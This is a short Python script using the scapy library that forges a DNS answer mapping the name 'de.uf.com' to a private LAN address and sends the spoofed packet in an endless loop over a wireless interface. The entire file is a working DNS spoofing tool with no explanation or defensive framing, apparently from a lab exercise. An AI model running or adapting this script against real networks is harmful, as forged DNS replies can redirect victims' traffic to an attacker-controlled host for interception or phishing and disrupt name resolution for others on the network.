import os
from scapy.all import *

local_ip = "192.168.43.228"
name = "de.uf.com"

ip = IP(dst=local_ip)
udp = UDP(sport=53, dport=53)
dnsqr = DNSQR(qname=name, qtype='A', qclass='IN')
dnsrr = DNSRR(rrname=name, ttl=330, type="A", rclass="IN", rdata=local_ip)
dns = DNS(id=1234, qr=1, aa=0, rcode=0, qd=dnsqr, an=dnsrr)


pkt = ip/udp/dns

while True:
	send(pkt, iface="wlp2s0")